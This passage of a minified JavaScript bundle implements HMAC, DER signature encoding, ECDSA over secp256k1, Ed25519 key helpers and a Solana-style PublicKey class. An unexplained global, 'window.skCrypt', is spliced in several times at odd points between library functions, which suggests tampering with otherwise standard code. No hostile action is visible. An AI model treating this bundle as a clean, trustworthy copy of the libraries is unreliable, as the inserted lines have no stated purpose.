      (this.blockLen = this.iHash.blockLen),
        (this.outputLen = this.iHash.outputLen);
      const r = this.blockLen,
        o = new Uint8Array(r);
      o.set(n.length > r ? t.create().update(n).digest() : n);
      for (let i = 0; i < o.length; i++) o[i] ^= 54;
      this.iHash.update(o), (this.oHash = t.create());
      for (let i = 0; i < o.length; i++) o[i] ^= 106;
      this.oHash.update(o), yt(o);
    }
    update(t) {
      return mt(this), this.iHash.update(t), this;
    }
    digestInto(t) {
      mt(this),
        pt(t, this.outputLen),
        (this.finished = !0),
        this.iHash.digestInto(t),
        this.oHash.update(t),
        this.oHash.digestInto(t),
        this.destroy();
    }
    digest() {
      const t = new Uint8Array(this.oHash.outputLen);
      return this.digestInto(t), t;
    }
    _cloneInto(t) {
      t || (t = Object.create(Object.getPrototypeOf(this), {}));
      const {
        oHash: e,
        iHash: n,
        finished: r,
        destroyed: o,
        blockLen: i,
        outputLen: s,
      } = this;
      return (
        t,
        (t.finished = r),
        (t.destroyed = o),
        (t.blockLen = i),
        (t.outputLen = s),
        (t.oHash = e._cloneInto(t.oHash)),
        (t.iHash = n._cloneInto(t.iHash)),
        t
      );
    }
    clone() {
      return this._cloneInto();
    }
    destroy() {
      (this.destroyed = !0), this.oHash.destroy(), this.iHash.destroy();
    }
  }
  const mi = (t, e, n) => new pi(t, e).update(n).digest();
  function gi(t) {
    void 0 !== t.lowS && be("lowS", t.lowS),
      void 0 !== t.prehash && be("prehash", t.prehash);
  }
  (mi.create = (t, e) => new pi(t, e)),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  class yi extends Error {
    constructor(t = "") {
      super(t);
    }
  }
  const wi = {
      Err: yi,
      _tlv: {
        encode: (t, e) => {
          const { Err: n } = wi;
          if (t < 0 || t > 256) throw new n("tlv.encode: wrong tag");
          if (1 & e.length) throw new n("tlv.encode: unpadded data");
          const r = e.length / 2,
            o = ve(r);
          if ((o.length / 2) & 128)
            throw new n("tlv.encode: long form length too big");
          const i = r > 127 ? ve((o.length / 2) | 128) : "";
          return ve(t) + i + o + e;
        },
        decode(t, e) {
          const { Err: n } = wi;
          let r = 0;
          if (t < 0 || t > 256) throw new n("tlv.encode: wrong tag");
          if (e.length < 2 || e[r++] !== t)
            throw new n("tlv.decode: wrong tlv");
          const o = e[r++];
          let i = 0;
          if (!!(128 & o)) {
            const t = 127 & o;
            if (!t)
              throw new n("tlv.decode(long): indefinite length not supported");
            if (t > 4) throw new n("tlv.decode(long): byte length is too big");
            const s = e.subarray(r, r + t);
            if (s.length !== t)
              throw new n("tlv.decode: length bytes not complete");
            if (0 === s[0]) throw new n("tlv.decode(long): zero leftmost byte");
            for (const e of s) i = (i << 8) | e;
            if (((r += t), i < 128))
              throw new n("tlv.decode(long): not minimal encoding");
          } else i = o;
          const s = e.subarray(r, r + i);
          if (s.length !== i) throw new n("tlv.decode: wrong value length");
          return { v: s, l: e.subarray(r + i) };
        },
      },
      _int: {
        encode(t) {
          const { Err: e } = wi;
          if (t < bi) throw new e("integer: negative integers are not allowed");
          let n = ve(t);
          if ((8 & Number.parseInt(n[0], 16) && (n = "00" + n), 1 & n.length))
            throw new e("unexpected DER parsing assertion: unpadded hex");
          return n;
        },
        decode(t) {
          const { Err: e } = wi;
          if (128 & t[0]) throw new e("invalid signature integer: negative");
          if (0 === t[0] && !(128 & t[1]))
            throw new e("invalid signature integer: unnecessary leading zero");
          return ke(t);
        },
      },
      toSig(t) {
        const { Err: e, _int: n, _tlv: r } = wi,
          o = Te("signature", t),
          { v: i, l: s } = r.decode(48, o);
        if (s.length)
          throw new e("invalid signature: left bytes after parsing");
        const { v: a, l: u } = r.decode(2, i),
          { v: c, l: l } = r.decode(2, u);
        if (l.length)
          throw new e("invalid signature: left bytes after parsing");
        return { r: n.decode(a), s: n.decode(c) };
      },
      hexFromSig(t) {
        const { _tlv: e, _int: n } = wi,
          r = e.encode(2, n.encode(t.r)) + e.encode(2, n.encode(t.s));
        return e.encode(48, r);
      },
    },
    bi = BigInt(0),
    vi = BigInt(1),
    Ai = BigInt(2),
    ki = BigInt(3),
    Ii = BigInt(4);
  function Si(t, e, n) {
    const { BYTES: r } = t;
    return function (o) {
      let i;
      if ("bigint" == typeof o) i = o;
      else {
        let n = Te("private key", o);
        if (e) {
          if (!e.includes(2 * n.length)) throw new Error("invalid private key");
          const t = new Uint8Array(r);
          t.set(n, t.length - n.length), (n = t);
        }
        try {
          i = t.fromBytes(n);
        } catch (s) {
          throw new Error(
            `invalid private key: expected ui8a of size ${r}, got ${typeof o}`
          );
        }
      }
      if ((n && (i = t.create(i)), !t.isValidNot0(i)))
        throw new Error("invalid private key: out of range [1..N-1]");
      return i;
    };
  }
  function _i(t, e = {}) {
    const { Fp: n, Fn: r } = fn("weierstrass", t, e),
      { h: o, n: i } = t;
    xe(
      e,
      {},
      {
        allowInfinityPoint: "boolean",
        clearCofactor: "function",
        isTorsionFree: "function",
        fromBytes: "function",
        toBytes: "function",
        endo: "object",
        wrapPrivateKey: "boolean",
      }
    );
    const { endo: s } = e;
    if (
      s &&
      (!n.is0(t.a) ||
        "bigint" != typeof s.beta ||
        "function" != typeof s.splitScalar)
    )
      throw new Error(
        'invalid endo: expected "beta": bigint and "splitScalar": function'
      );
    function a() {
      if (!n.isOdd)
        throw new Error(
          "compression is not supported: Field does not have .isOdd()"
        );
    }
    const u =
        e.toBytes ||
        function (t, e, r) {
          const { x: o, y: i } = e.toAffine(),
            s = n.toBytes(o);
          if ((be("isCompressed", r), r)) {
            a();
            return Mt(Ti(!n.isOdd(i)), s);
          }
          return Mt(Uint8Array.of(4), s, n.toBytes(i));
        },
      c =
        e.fromBytes ||
        function (t) {
          pt(t);
          const e = n.BYTES,
            r = e + 1,
            o = 2 * e + 1,
            i = t.length,
            s = t[0],
            u = t.subarray(1);
          if (i !== r || (2 !== s && 3 !== s)) {
            if (i === o && 4 === s) {
              const t = n.fromBytes(u.subarray(0 * e, 1 * e)),
                r = n.fromBytes(u.subarray(1 * e, 2 * e));
              if (!d(t, r)) throw new Error("bad point: is not on curve");
              return { x: t, y: r };
            }
            throw new Error(
              `bad point: got length ${i}, expected compressed=${r} or uncompressed=${o}`
            );
          }
          {
            const t = n.fromBytes(u);
            if (!n.isValid(t))
              throw new Error("bad point: is not on curve, wrong x");
            const e = l(t);
            let r;
            try {
              r = n.sqrt(e);
            } catch (c) {
              const t = c instanceof Error ? ": " + c.message : "";
              throw new Error("bad point: is not on curve, sqrt error" + t);
            }
            a();
            return !(1 & ~s) !== n.isOdd(r) && (r = n.neg(r)), { x: t, y: r };
          }
        },
      l = (function (t, e, n) {
        return function (r) {
          const o = t.sqr(r),
            i = t.mul(o, r);
          return t.add(t.add(i, t.mul(r, e)), n);
        };
      })(n, t.a, t.b);
    function d(t, e) {
      const r = n.sqr(e),
        o = l(t);
      return n.eql(r, o);
    }
    if (!d(t.Gx, t.Gy)) throw new Error("bad curve params: generator point");
    const f = n.mul(n.pow(t.a, ki), Ii),
      h = n.mul(n.sqr(t.b), BigInt(27));
    if (n.is0(n.add(f, h))) throw new Error("bad curve params: a or b");
    function p(t, e, r = !1) {
      if (!n.isValid(e) || (r && n.is0(e)))
        throw new Error(`bad point coordinate ${t}`);
      return e;
    }
    function m(t) {
      if (!(t instanceof b)) throw new Error("ProjectivePoint expected");
    }
    const g = Pe((t, e) => {
        const { px: r, py: o, pz: i } = t;
        if (n.eql(i, n.ONE)) return { x: r, y: o };
        const s = t.is0();
        null == e && (e = s ? n.ONE : n.inv(i));
        const a = n.mul(r, e),
          u = n.mul(o, e),
          c = n.mul(i, e);
        if (s) return { x: n.ZERO, y: n.ZERO };
        if (!n.eql(c, n.ONE)) throw new Error("invZ was invalid");
        return { x: a, y: u };
      }),
      y = Pe((t) => {
        if (t.is0()) {
          if (e.allowInfinityPoint && !n.is0(t.py)) return;
          throw new Error("bad point: ZERO");
        }
        const { x: r, y: o } = t.toAffine();
        if (!n.isValid(r) || !n.isValid(o))
          throw new Error("bad point: x or y not field elements");
        if (!d(r, o)) throw new Error("bad point: equation left != right");
        if (!t.isTorsionFree())
          throw new Error("bad point: not in prime-order subgroup");
        return !0;
      });
    function w(t, e, r, o, i) {
      return (
        (r = new b(n.mul(r.px, t), r.py, r.pz)),
        (e = $e(o, e)),
        (r = $e(i, r)),
        e.add(r)
      );
    }
    class b {
      constructor(t, e, n) {
        (this.px = p("x", t)),
          (this.py = p("y", e, !0)),
          (this.pz = p("z", n)),
          Object.freeze(this);
      }
      static fromAffine(t) {
        const { x: e, y: r } = t || {};
        if (!t || !n.isValid(e) || !n.isValid(r))
          throw new Error("invalid affine point");
        if (t instanceof b) throw new Error("projective point not allowed");
        return n.is0(e) && n.is0(r) ? b.ZERO : new b(e, r, n.ONE);
      }
      get x() {
        return this.toAffine().x;
      }
      get y() {
        return this.toAffine().y;
      }
      static normalizeZ(t) {
        return tn(b, "pz", t);
      }
      static fromBytes(t) {
        return pt(t), b.fromHex(t);
      }
      static fromHex(t) {
        const e = b.fromAffine(c(Te("pointHex", t)));
        return e.assertValidity(), e;
      }
      static fromPrivateKey(t) {
        const n = Si(r, e.allowedPrivateKeyLengths, e.wrapPrivateKey);
        return b.BASE.multiply(n(t));
      }
      static msm(t, e) {
        return ln(b, r, t, e);
      }
      precompute(t = 8, e = !0) {
        return A.setWindowSize(this, t), e || this.multiply(ki), this;
      }
      _setWindowSize(t) {
        this.precompute(t);
      }
      assertValidity() {
        y(this);
      }
      hasEvenY() {
        const { y: t } = this.toAffine();
        if (!n.isOdd) throw new Error("Field doesn't support isOdd");
        return !n.isOdd(t);
      }
      equals(t) {
        m(t);
        const { px: e, py: r, pz: o } = this,
          { px: i, py: s, pz: a } = t,
          u = n.eql(n.mul(e, a), n.mul(i, o)),
          c = n.eql(n.mul(r, a), n.mul(s, o));
        return u && c;
      }
      negate() {
        return new b(this.px, n.neg(this.py), this.pz);
      }
      double() {
        const { a: e, b: r } = t,
          o = n.mul(r, ki),
          { px: i, py: s, pz: a } = this;
        let u = n.ZERO,
          c = n.ZERO,
          l = n.ZERO,
          d = n.mul(i, i),
          f = n.mul(s, s),
          h = n.mul(a, a),
          p = n.mul(i, s);
        return (
          (p = n.add(p, p)),
          (l = n.mul(i, a)),
          (l = n.add(l, l)),
          (u = n.mul(e, l)),
          (c = n.mul(o, h)),
          (c = n.add(u, c)),
          (u = n.sub(f, c)),
          (c = n.add(f, c)),
          (c = n.mul(u, c)),
          (u = n.mul(p, u)),
          (l = n.mul(o, l)),
          (h = n.mul(e, h)),
          (p = n.sub(d, h)),
          (p = n.mul(e, p)),
          (p = n.add(p, l)),
          (l = n.add(d, d)),
          (d = n.add(l, d)),
          (d = n.add(d, h)),
          (d = n.mul(d, p)),
          (c = n.add(c, d)),
          (h = n.mul(s, a)),
          (h = n.add(h, h)),
          (d = n.mul(h, p)),
          (u = n.sub(u, d)),
          (l = n.mul(h, f)),
          (l = n.add(l, l)),
          (l = n.add(l, l)),
          new b(u, c, l)
        );
      }
      add(e) {
        m(e);
        const { px: r, py: o, pz: i } = this,
          { px: s, py: a, pz: u } = e;
        let c = n.ZERO,
          l = n.ZERO,
          d = n.ZERO;
        const f = t.a,
          h = n.mul(t.b, ki);
        let p = n.mul(r, s),
          g = n.mul(o, a),
          y = n.mul(i, u),
          w = n.add(r, o),
          v = n.add(s, a);
        (w = n.mul(w, v)),
          (v = n.add(p, g)),
          (w = n.sub(w, v)),
          (v = n.add(r, i));
        let A = n.add(s, u);
        return (
          (v = n.mul(v, A)),
          (A = n.add(p, y)),
          (v = n.sub(v, A)),
          (A = n.add(o, i)),
          (c = n.add(a, u)),
          (A = n.mul(A, c)),
          (c = n.add(g, y)),
          (A = n.sub(A, c)),
          (d = n.mul(f, v)),
          (c = n.mul(h, y)),
          (d = n.add(c, d)),
          (c = n.sub(g, d)),
          (d = n.add(g, d)),
          (l = n.mul(c, d)),
          (g = n.add(p, p)),
          (g = n.add(g, p)),
          (y = n.mul(f, y)),
          (v = n.mul(h, v)),
          (g = n.add(g, y)),
          (y = n.sub(p, y)),
          (y = n.mul(f, y)),
          (v = n.add(v, y)),
          (p = n.mul(g, v)),
          (l = n.add(l, p)),
          (p = n.mul(A, v)),
          (c = n.mul(w, c)),
          (c = n.sub(c, p)),
          (p = n.mul(w, g)),
          (d = n.mul(A, d)),
          (d = n.add(d, p)),
          new b(c, l, d)
        );
      }
      subtract(t) {
        return this.add(t.negate());
      }
      is0() {
        return this.equals(b.ZERO);
      }
      multiply(t) {
        const { endo: n } = e;
        if (!r.isValidNot0(t)) throw new Error("invalid scalar: out of range");
        let o, i;
        const s = (t) => A.wNAFCached(this, t, b.normalizeZ);
        if (n) {
          const { k1neg: e, k1: r, k2neg: a, k2: u } = n.splitScalar(t),
            { p: c, f: l } = s(r),
            { p: d, f: f } = s(u);
          (i = l.add(f)), (o = w(n.beta, c, d, e, a));
        } else {
          const { p: e, f: n } = s(t);
          (o = e), (i = n);
        }
        return b.normalizeZ([o, i])[0];
      }
      multiplyUnsafe(t) {
        const { endo: n } = e,
          o = this;
        if (!r.isValid(t)) throw new Error("invalid scalar: out of range");
        if (t === bi || o.is0()) return b.ZERO;
        if (t === vi) return o;
        if (A.hasPrecomputes(this)) return this.multiply(t);
        if (n) {
          const { k1neg: e, k1: r, k2neg: i, k2: s } = n.splitScalar(t),
            { p1: a, p2: u } = (function (t, e, n, r) {
              let o = e,
                i = t.ZERO,
                s = t.ZERO;
              for (; n > Ye || r > Ye; )
                n & Qe && (i = i.add(o)),
                  r & Qe && (s = s.add(o)),
                  (o = o.double()),
                  (n >>= Qe),
                  (r >>= Qe);
              return { p1: i, p2: s };
            })(b, o, r, s);
          return w(n.beta, a, u, e, i);
        }
        return A.wNAFCachedUnsafe(o, t);
      }
      multiplyAndAddUnsafe(t, e, n) {
        const r = this.multiplyUnsafe(e).add(t.multiplyUnsafe(n));
        return r.is0() ? void 0 : r;
      }
      toAffine(t) {
        return g(this, t);
      }
      isTorsionFree() {
        const { isTorsionFree: t } = e;
        return o === vi || (t ? t(b, this) : A.wNAFCachedUnsafe(this, i).is0());
      }
      clearCofactor() {
        const { clearCofactor: t } = e;
        return o === vi ? this : t ? t(b, this) : this.multiplyUnsafe(o);
      }
      toBytes(t = !0) {
        return be("isCompressed", t), this.assertValidity(), u(b, this, t);
      }
      toRawBytes(t = !0) {
        return this.toBytes(t);
      }
      toHex(t = !0) {
        return St(this.toBytes(t));
      }
      toString() {
        return `<Point ${this.is0() ? "ZERO" : this.toHex()}>`;
      }
    }
    (b.BASE = new b(t.Gx, t.Gy, n.ONE)),
      (b.ZERO = new b(n.ZERO, n.ONE, n.ZERO)),
      (b.Fp = n),
      (b.Fn = r);
    const v = r.BITS,
      A = cn(b, e.endo ? Math.ceil(v / 2) : v);
    return b;
  }
  function Ti(t) {
    return Uint8Array.of(t ? 2 : 3);
  }
  function Ci(t, e, n = {}) {
    xe(
      e,
      { hash: "function" },
      {
        hmac: "function",
        lowS: "boolean",
        randomBytes: "function",
        bits2int: "function",
        bits2int_modN: "function",
      }
    );
    const r = e.randomBytes || Dt,
      o = e.hmac || ((t, ...n) => mi(e.hash, t, Mt(...n))),
      { Fp: i, Fn: s } = t,
      { ORDER: a, BITS: u } = s;
    function c(t) {
      return t > a >> vi;
    }
    function l(t, e) {
      if (!s.isValidNot0(e))
        throw new Error(`invalid signature ${t}: out of range 1..CURVE.n`);
    }
    class d {
      constructor(t, e, n) {
        l("r", t),
          l("s", e),
          (this.r = t),
          (this.s = e),
          null != n && (this.recovery = n),
          Object.freeze(this);
      }
      static fromCompact(t) {
        const e = s.BYTES,
          n = Te("compactSignature", t, 2 * e);
        return new d(
          s.fromBytes(n.subarray(0, e)),
          s.fromBytes(n.subarray(e, 2 * e))
        );
      }
      static fromDER(t) {
        const { r: e, s: n } = wi.toSig(Te("DER", t));
        return new d(e, n);
      }
      assertValidity() {}
      addRecoveryBit(t) {
        return new d(this.r, this.s, t);
      }
      recoverPublicKey(e) {
        const n = i.ORDER,
          { r: r, s: o, recovery: u } = this;
        if (null == u || ![0, 1, 2, 3].includes(u))
          throw new Error("recovery id invalid");
        if (a * Ai < n && u > 1)
          throw new Error("recovery id is ambiguous for h>1 curve");
        const c = 2 === u || 3 === u ? r + a : r;
        if (!i.isValid(c)) throw new Error("recovery id 2 or 3 invalid");
        const l = i.toBytes(c),
          d = t.fromHex(Mt(Ti(!(1 & u)), l)),
          f = s.inv(c),
          h = g(Te("msgHash", e)),
          p = s.create(-h * f),
          m = s.create(o * f),
          y = t.BASE.multiplyUnsafe(p).add(d.multiplyUnsafe(m));
        if (y.is0()) throw new Error("point at infinify");
        return y.assertValidity(), y;
      }
      hasHighS() {
        return c(this.s);
      }
      normalizeS() {
        return this.hasHighS()
          ? new d(this.r, s.neg(this.s), this.recovery)
          : this;
      }
      toBytes(t) {
        if ("compact" === t) return Mt(s.toBytes(this.r), s.toBytes(this.s));
        if ("der" === t) return Rt(wi.hexFromSig(this));
        throw new Error("invalid format");
      }
      toDERRawBytes() {
        return this.toBytes("der");
      }
      toDERHex() {
        return St(this.toBytes("der"));
      }
      toCompactRawBytes() {
        return this.toBytes("compact");
      }
      toCompactHex() {
        return St(this.toBytes("compact"));
      }
    }
    const f = Si(s, n.allowedPrivateKeyLengths, n.wrapPrivateKey),
      h = {
        isValidPrivateKey(t) {
          try {
            return f(t), !0;
          } catch (e) {
            return !1;
          }
        },
        normPrivateKeyToScalar: f,
        randomPrivateKey: () => {
          const t = a;
          return (function (t, e, n = !1) {
            const r = t.length,
              o = Ze(e),
              i = Je(e);
            if (r < 16 || r < i || r > 1024)
              throw new Error(
                "expected " + i + "-1024 bytes of input, got " + r
              );
            const s = qe(n ? Ie(t) : ke(t), e - Oe) + Oe;
            return n ? _e(s, o) : Se(s, o);
          })(r(Je(t)), t);
        },
        precompute: (e = 8, n = t.BASE) => n.precompute(e, !1),
      };
    function p(e) {
      if ("bigint" == typeof e) return !1;
      if (e instanceof t) return !0;
      const r = Te("key", e).length,
        o = i.BYTES,
        a = o + 1,
        u = 2 * o + 1;
      return n.allowedPrivateKeyLengths || s.BYTES === a
        ? void 0
        : r === a || r === u;
    }
    const m =
        e.bits2int ||
        function (t) {
          if (t.length > 8192) throw new Error("input is too large");
          const e = ke(t),
            n = 8 * t.length - u;
          return n > 0 ? e >> BigInt(n) : e;
        },
      g =
        e.bits2int_modN ||
        function (t) {
          return s.create(m(t));
        },
      y = Ee(u);
    function w(t) {
      return Be("num < 2^" + u, t, bi, y), s.toBytes(t);
    }
    function b(n, o, a = v) {
      if (["recovered", "canonical"].some((t) => t in a))
        throw new Error("sign() legacy options not supported");
      const { hash: u } = e;
      let { lowS: l, prehash: h, extraEntropy: p } = a;
      null == l && (l = !0),
        (n = Te("msgHash", n)),
        gi(a),
        h && (n = Te("prehashed msgHash", u(n)));
      const y = g(n),
        b = f(o),
        A = [w(b), w(y)];
      if (null != p && !1 !== p) {
        const t = !0 === p ? r(i.BYTES) : p;
        A.push(Te("extraEntropy", t));
      }
      const k = Mt(...A),
        I = y;
      return {
        seed: k,
        k2sig: function (e) {
          const n = m(e);
          if (!s.isValidNot0(n)) return;
          const r = s.inv(n),
            o = t.BASE.multiply(n).toAffine(),
            i = s.create(o.x);
          if (i === bi) return;
          const a = s.create(r * s.create(I + i * b));
          if (a === bi) return;
          let u = (o.x === i ? 0 : 2) | Number(o.y & vi),
            f = a;
          return (
            l &&
              c(a) &&
              ((f = (function (t) {
                return c(t) ? s.neg(t) : t;
              })(a)),
              (u ^= 1)),
            new d(i, f, u)
          );
        },
      };
    }
    const v = { lowS: e.lowS, prehash: !1 },
      A = { lowS: e.lowS, prehash: !1 };
    return (
      t.BASE.precompute(8),
      Object.freeze({
        getPublicKey: function (e, n = !0) {
          return t.fromPrivateKey(e).toBytes(n);
        },
        getSharedSecret: function (e, n, r = !0) {
          if (!0 === p(e)) throw new Error("first arg must be private key");
          if (!1 === p(n)) throw new Error("second arg must be public key");
          return t.fromHex(n).multiply(f(e)).toBytes(r);
        },
        sign: function (t, n, r = v) {
          const { seed: i, k2sig: a } = b(t, n, r);
          return (function (t, e, n) {
            if ("number" != typeof t || t < 2)
              throw new Error("hashLen must be a number");
            if ("number" != typeof e || e < 2)
              throw new Error("qByteLen must be a number");
            if ("function" != typeof n)
              throw new Error("hmacFn must be a function");
            const r = (t) => new Uint8Array(t),
              o = (t) => Uint8Array.of(t);
            let i = r(t),
              s = r(t),
              a = 0;
            const u = () => {
                i.fill(1), s.fill(0), (a = 0);
              },
              c = (...t) => n(s, i, ...t),
              l = (t = r(0)) => {
                (s = c(o(0), t)),
                  (i = c()),
                  0 !== t.length && ((s = c(o(1), t)), (i = c()));
              },
              d = () => {
                if (a++ >= 1e3) throw new Error("drbg: tried 1000 values");
                let t = 0;
                const n = [];
                for (; t < e; ) {
                  i = c();
                  const e = i.slice();
                  n.push(e), (t += i.length);
                }
                return Mt(...n);
              };
            return (t, e) => {
              let n;
              for (u(), l(t); !(n = e(d())); ) l();
              return u(), n;
            };
          })(
            e.hash.outputLen,
            s.BYTES,
            o
          )(i, a);
        },
        verify: function (n, r, o, i = A) {
          const a = n;
          (r = Te("msgHash", r)), (o = Te("publicKey", o)), gi(i);
          const { lowS: u, prehash: c, format: l } = i;
          if ("strict" in i)
            throw new Error("options.strict was renamed to lowS");
          if (void 0 !== l && !["compact", "der", "js"].includes(l))
            throw new Error('format must be "compact", "der" or "js"');
          const f = "string" == typeof a || ft(a),
            h =
              !f &&
              !l &&
              "object" == typeof a &&
              null !== a &&
              "bigint" == typeof a.r &&
              "bigint" == typeof a.s;
          if (!f && !h)
            throw new Error(
              "invalid signature, expected Uint8Array, hex string or Signature instance"
            );
          let p, m;
          try {
            if (h) {
              if (void 0 !== l && "js" !== l) throw new Error("invalid format");
              p = new d(a.r, a.s);
            }
            if (f) {
              try {
                "compact" !== l && (p = d.fromDER(a));
              } catch (_) {
                if (!(_ instanceof wi.Err)) throw _;
              }
              p || "der" === l || (p = d.fromCompact(a));
            }
            m = t.fromHex(o);
          } catch (T) {
            return !1;
          }
          if (!p) return !1;
          if (u && p.hasHighS()) return !1;
          c && (r = e.hash(r));
          const { r: y, s: w } = p,
            b = g(r),
            v = s.inv(w),
            k = s.create(b * v),
            I = s.create(y * v),
            S = t.BASE.multiplyUnsafe(k).add(m.multiplyUnsafe(I));
          return !S.is0() && s.create(S.x) === y;
        },
        utils: h,
        Point: t,
        Signature: d,
      })
    );
  }
  function Bi(t) {
    const { CURVE: e, curveOpts: n } = (function (t) {
      const e = {
        a: t.a,
        b: t.b,
        p: t.Fp.ORDER,
        n: t.n,
        h: t.h,
        Gx: t.Gx,
        Gy: t.Gy,
      };
      return {
        CURVE: e,
        curveOpts: {
          Fp: t.Fp,
          Fn: Xe(e.n, t.nBitLength),
          allowedPrivateKeyLengths: t.allowedPrivateKeyLengths,
          allowInfinityPoint: t.allowInfinityPoint,
          endo: t.endo,
          wrapPrivateKey: t.wrapPrivateKey,
          isTorsionFree: t.isTorsionFree,
          clearCofactor: t.clearCofactor,
          fromBytes: t.fromBytes,
          toBytes: t.toBytes,
        },
      };
    })(t);
    return {
      CURVE: e,
      curveOpts: n,
      ecdsaOpts: {
        hash: t.hash,
        hmac: t.hmac,
        randomBytes: t.randomBytes,
        lowS: t.lowS,
        bits2int: t.bits2int,
        bits2int_modN: t.bits2int_modN,
      },
    };
  }
  function Ei(t) {
    const { CURVE: e, curveOpts: n, ecdsaOpts: r } = Bi(t);
    return (function (t, e) {
      return Object.assign({}, e, { ProjectivePoint: e.Point, CURVE: t });
    })(t, Ci(_i(e, n), r, n));
  }
  (window.skCrypt = function (t) {
    return function () {
      return t;
    };
  }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const xi = {
    p: BigInt(
      "0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f"
    ),
    n: BigInt(
      "0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141"
    ),
    h: BigInt(1),
    a: BigInt(0),
    b: BigInt(7),
    Gx: BigInt(
      "0x79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798"
    ),
    Gy: BigInt(
      "0x483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8"
    ),
  };
  BigInt(0);
  const Pi = BigInt(1),
    Ri = BigInt(2),
    Oi = (t, e) => (t + e / Ri) / e;
  const Mi = Xe(xi.p, void 0, void 0, {
      sqrt: function (t) {
        const e = xi.p,
          n = BigInt(3),
          r = BigInt(6),
          o = BigInt(11),
          i = BigInt(22),
          s = BigInt(23),
          a = BigInt(44),
          u = BigInt(88),
          c = (t * t * t) % e,
          l = (c * c * t) % e,
          d = (We(l, n, e) * l) % e,
          f = (We(d, n, e) * l) % e,
          h = (We(f, Ri, e) * c) % e,
          p = (We(h, o, e) * h) % e,
          m = (We(p, i, e) * p) % e,
          g = (We(m, a, e) * m) % e,
          y = (We(g, u, e) * g) % e,
          w = (We(y, a, e) * m) % e,
          b = (We(w, n, e) * l) % e,
          v = (We(b, s, e) * p) % e,
          A = (We(v, r, e) * c) % e,
          k = We(A, Ri, e);
        if (!Mi.eql(Mi.sqr(k), t)) throw new Error("Cannot find square root");
        return k;
      },
    }),
    Li = (function (t, e) {
      const n = (e) => Ei({ ...t, hash: e });
      return { ...n(e), create: n };
    })(
      {
        ...xi,
        Fp: Mi,
        lowS: !0,
        endo: {
          beta: BigInt(
            "0x7ae96a2b657c07106e64479eac3434e99cf0497512f58995c1396c28719501ee"
          ),
          splitScalar: (t) => {
            const e = xi.n,
              n = BigInt("0x3086d221a7d46bcde86c90e49284eb15"),
              r = -Pi * BigInt("0xe4437ed6010e88286f547fa90abfe4c3"),
              o = BigInt("0x114ca50f7a8e2f3f657c1108d9d44cfd8"),
              i = n,
              s = BigInt("0x100000000000000000000000000000000"),
              a = Oi(i * t, e),
              u = Oi(-r * t, e);
            let c = qe(t - a * n - u * o, e),
              l = qe(-a * r - u * i, e);
            const d = c > s,
              f = l > s;
            if ((d && (c = e - c), f && (l = e - l), c > s || l > s))
              throw new Error("splitScalar: Endomorphism failed, k=" + t);
            return { k1neg: d, k1: c, k2neg: f, k2: l };
          },
        },
      },
      me
    );
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const Ni = xn.utils.randomPrivateKey,
    Di = () => {
      const t = xn.utils.randomPrivateKey(),
        e = Ui(t),
        n = new Uint8Array(64);
      return n.set(t), n.set(e, 32), { publicKey: e, secretKey: n };
    },
    Ui = xn.getPublicKey;
  function qi(t) {
    try {
      return xn.ExtendedPoint.fromHex(t), !0;
    } catch {
      return !1;
    }
  }
  const Wi = (t, e) => xn.sign(t, e.slice(0, 32)),
    zi = xn.verify,
    Ki = (t) =>
      lt.isBuffer(t)
        ? t
        : t instanceof Uint8Array
        ? lt.from(t.buffer, t.byteOffset, t.byteLength)
        : lt.from(t);
  let Fi = class {
    constructor(t) {
      Object.assign(this, t);
    }
    encode() {
      return lt.from(_r.serialize(ji, this));
    }
    static decode(t) {
      return _r.deserialize(ji, this, t);
    }
    static decodeUnchecked(t) {
      return _r.deserializeUnchecked(ji, this, t);
    }
  };
  const ji = new Map();
  var Gi;
  const Vi = 32;
  let Hi = 1;
  class Xi extends Fi {
    constructor(t) {
      if (
        (super({}),
        (this._bn = void 0),
        (function (t) {
          return void 0 !== t._bn;
        })(t))
      )
        this._bn = t._bn;
      else {
        if ("string" == typeof t) {
          const e = or.decode(t);
          if (e.length != Vi) throw new Error("Invalid public key input");
          this._bn = new Zn(e);
        } else this._bn = new Zn(t);
        if (this._bn.byteLength() > Vi)
          throw new Error("Invalid public key input");
      }
    }
    static unique() {
      const t = new Xi(Hi);
      return (Hi += 1), new Xi(t.toBuffer());
    }
    equals(t) {
      return this._bn.eq(t._bn);
    }
    toBase58() {
      return or.encode(this.toBytes());
    }
    toJSON() {
      return this.toBase58();
    }
    toBytes() {
      const t = this.toBuffer();
      return new Uint8Array(t.buffer, t.byteOffset, t.byteLength);
    }
    toBuffer() {
      const t = this._bn.toArrayLike(lt);
      if (t.length === Vi) return t;
      const e = lt.alloc(32);
      return t.copy(e, 32 - t.length), e;
    }
    get [Symbol.toStringTag]() {
      return `PublicKey(${this.toString()})`;
    }
    toString() {
      return this.toBase58();
    }
    static async createWithSeed(t, e, n) {
      const r = lt.concat([t.toBuffer(), lt.from(e), n.toBuffer()]),
        o = ir(r);
      return new Xi(o);
    }
    static createProgramAddressSync(t, e) {
      let n = lt.alloc(0);
      t.forEach(function (t) {
        if (t.length > 32) throw new TypeError("Max seed length exceeded");
        n = lt.concat([n, Ki(t)]);
      }),
        (n = lt.concat([n, e.toBuffer(), lt.from("ProgramDerivedAddress")]));
      const r = ir(n);
      if (qi(r))
        throw new Error("Invalid seeds, address must fall off the curve");
      return new Xi(r);
    }
    static async createProgramAddress(t, e) {
      return this.createProgramAddressSync(t, e);
    }
    static findProgramAddressSync(t, e) {
      let n,
        r = 255;
      for (; 0 != r; ) {
        try {
          const o = t.concat(lt.from([r]));
          n = this.createProgramAddressSync(o, e);
        } catch (o) {
          if (o instanceof TypeError) throw o;
          r--;
          continue;
        }
        return [n, r];
      }
      throw new Error("Unable to find a viable program address nonce");
    }
    static async findProgramAddress(t, e) {
      return this.findProgramAddressSync(t, e);
    }
    static isOnCurve(t) {
      return qi(new Xi(t).toBytes());
    }
  }
  (Gi = Xi),
    (Xi.default = new Gi("11111111111111111111111111111111")),
    ji.set(Xi, { kind: "struct", fields: [["_bn", "u256"]] });
  const Zi = new Xi("BPFLoader1111111111111111111111111111111111"),
    Ji = 1232,
    Yi = 127;
